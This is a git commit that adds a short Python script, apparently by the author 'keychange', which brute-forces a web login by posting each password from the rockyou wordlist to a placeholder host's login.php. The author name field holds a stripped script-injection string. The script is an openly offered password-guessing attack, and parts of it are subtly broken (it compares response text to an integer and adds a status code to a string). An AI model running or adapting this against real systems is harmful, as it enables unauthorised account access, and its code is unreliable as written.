0079db6e7ce5aa0cbef5e4781bd354b74ccf18a5
scriptalert("stop");/script <97823425+keychange@users.noreply.github.com>
2022-07-18 22:29:32 -0400

    Create postmalone.py

---
+++ postmalone.py
@@ -0,0 +1,22 @@
+# SCRIPT FOR HTTP URL .PHP RESPONSE 0 OR 1
+# 0 = false
+# 1 = true
+# made by keychange
+
+import requests
+
+with open('/usr/share/wordlists/rockyou.txt') as f:
+ for line in f:
+  payload='var1=usuario&var2='+line
+  r = requests.post('http://X.X.X.X/login.php', data=payload)
+  print('[+] PAYLOAD '+payload)
+  print('[+] URL '+r.url)
+  print('[+] RESPONSE: '+r.text)
+  if r.text == 1:
+   print('------------------------')
+   print('[+] STATUS CODE: '+r.status_code, r.reason)
+   print('[+] ===>' + r.text[:300]+'[+]')
+   print(line)
+   break
+  else:
+   print('')
